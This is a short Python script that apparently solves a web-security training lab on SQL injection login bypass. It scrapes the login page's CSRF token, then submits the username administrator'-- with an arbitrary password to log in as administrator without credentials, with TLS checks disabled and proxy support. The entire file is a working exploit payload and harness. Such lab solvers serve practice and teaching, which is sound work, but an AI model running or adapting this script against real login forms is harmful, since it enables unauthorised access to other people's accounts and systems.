import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection vulnerability allowing login bypass"


def get_csrf_token(session, url, proxies=None):
    r = session.get(url + "/login", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    input_tag = soup.find("input", attrs={"name": "csrf"})
    if input_tag:
        return input_tag.get("value", "")
    else:
        raise Exception("CSRF token not found")


def run(url, payload, proxies=None):
    """
    SQLi login bypass with CSRF token and session management
    """
    session = requests.Session()
    session.proxies = proxies or {}

    try:
        csrf = get_csrf_token(session, url, proxies)

        data = {
            "csrf": csrf,
            "username": "administrator'--",
            "password": "anything"
        }

        r = session.post(url.rstrip('/') + "/login", data=data, verify=False)

        return "Log out" in r.text

    except Exception as e:
        print(f"[!] Error: {e}")
        return False
